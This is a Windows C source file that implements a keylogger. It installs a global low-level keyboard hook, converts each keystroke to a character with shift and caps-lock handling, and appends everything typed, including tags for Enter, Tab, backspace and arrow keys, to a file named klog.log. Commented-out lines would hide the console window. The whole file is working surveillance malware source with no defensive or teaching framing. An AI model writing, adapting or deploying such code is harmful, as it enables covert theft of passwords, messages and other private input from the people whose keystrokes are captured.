#include <stdio.h>
#include <windows.h>
#include <ctype.h>

static FILE *file = NULL;

char GetCharFromVkCode(DWORD vkCode, BOOL isShiftPressed, BOOL isCapsLockOn) {
  char ch = (char)MapVirtualKeyA(vkCode, MAPVK_VK_TO_CHAR);

  if (ch >= 'A' && ch <= 'Z') {
    if (isShiftPressed ^ isCapsLockOn) {
      return ch;
    } else {
      return tolower(ch);
    }
  } else if (ch >= 'a' && ch <= 'z') {
    if (isShiftPressed ^ isCapsLockOn) {
      return toupper(ch);
    } else {
      return ch;
    }
  } else {
    if (isShiftPressed) {
      switch (vkCode) {
        case '1': return '!';
        case '2': return '@';
        case '3': return '#';
        case '4': return '$';
        case '5': return '%';
        case '6': return '^';
        case '7': return '&';
        case '8': return '*';
        case '9': return '(';
        case '0': return ')';
        case VK_OEM_MINUS: return '_';
        case VK_OEM_PLUS: return '+';
        case VK_OEM_4: return '{';
        case VK_OEM_6: return '}';
        case VK_OEM_5: return '|';
        case VK_OEM_1: return ':';
        case VK_OEM_7: return '"';
        case VK_OEM_COMMA: return '<';
        case VK_OEM_PERIOD: return '>';
        case VK_OEM_2: return '?';
        case VK_OEM_3: return '~';
        default: return ch;
      }
    } else {
      return ch;
    }
  }
}

LRESULT CALLBACK hook_proc(int code, WPARAM wParam, LPARAM lParam) {
  if (code < 0)
    return CallNextHookEx(NULL, code, wParam, lParam);

  if (wParam == WM_KEYDOWN) {
    KBDLLHOOKSTRUCT *pkey = (KBDLLHOOKSTRUCT *)lParam;

    BOOL isShiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
    BOOL isCapsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

    char c = GetCharFromVkCode(pkey->vkCode, isShiftPressed, isCapsLockOn);

    if (c != 0 && isprint(c)) {
      char chbuff = c;
      fwrite(&chbuff, 1, 1, file);
      fflush(file);
    } else {
      char strbuff[32];
      switch (pkey->vkCode) {
        case VK_TAB:
          strncpy(strbuff, "[TAB]", sizeof(strbuff)-1);
          strbuff[strlen("[TAB]")] = '\0';
          fwrite(strbuff, 1, strlen(strbuff), file);
          break;
        case VK_RETURN:
          strncpy(strbuff, "[ENTER]", sizeof(strbuff)-1);
          strbuff[strlen("[ENTER]")] = '\0';
          fwrite(strbuff, 1, strlen(strbuff), file);
          break;
        //case VK_CAPITAL: printf("[CAPS LCK]"); break;
        case VK_BACK:
          strncpy(strbuff, "[<-]", sizeof(strbuff)-1);
          strbuff[strlen("[<-]")] = '\0';
          fwrite(strbuff, 1, strlen(strbuff), file);
          break;
        case VK_DELETE:
          strncpy(strbuff, "[DEL]", sizeof(strbuff)-1);
          strbuff[strlen("[DEL]")] = '\0';
          fwrite(strbuff, 1, strlen(strbuff), file);
          break;
        case VK_LEFT:
          strncpy(strbuff, "[LEFT]", sizeof(strbuff)-1);
          strbuff[strlen("[LEFT]")] = '\0';
          fwrite(strbuff, 1, strlen(strbuff), file);
          break;
        case VK_RIGHT:
          strncpy(strbuff, "[RIGHT]", sizeof(strbuff)-1);
          strbuff[strlen("[RIGHT]")] = '\0';
          fwrite(strbuff, 1, strlen(strbuff), file);
          break;
        case VK_UP:
          strncpy(strbuff, "[UP]", sizeof(strbuff)-1);
          strbuff[strlen("[UP]")] = '\0';
          fwrite(strbuff, 1, strlen(strbuff), file);
          break;
        case VK_DOWN:
          strncpy(strbuff, "[DOWN]", sizeof(strbuff)-1);
          strbuff[strlen("[DOWN]")] = '\0';
          fwrite(strbuff, 1, strlen(strbuff), file);
          break;
        default:
          break;
      }
      fflush(file);
    }
  }
  return CallNextHookEx(NULL, code, wParam, lParam);
}

int main() {

  //STARTUPINFO si = {sizeof(si)};
  //PROCESS_INFORMATION pi;

  //si.dwFlags = STARTF_USESHOWWINDOW;
  //si.wShowWindow = SW_HIDE;

  file = fopen("klog.log", "a+");
  HHOOK hhook = SetWindowsHookExA(WH_KEYBOARD_LL, hook_proc, GetModuleHandle(NULL), 0);
  if (hhook == NULL) {
    //printf("Falha ao instalar o hook de teclado.\n");
    return 1;
  }

  //printf("Hook de teclado instalado com sucesso. Pressione Ctrl+C no console para sair.\n");
  //printf("Escrevendo no arquivo klog.log");
  MSG msg;
  while (GetMessage(&msg, NULL, 0, 0)) {
    TranslateMessage(&msg);
    DispatchMessage(&msg);
  }
  fclose(file);
  UnhookWindowsHookEx(hhook);
  return 0;
}
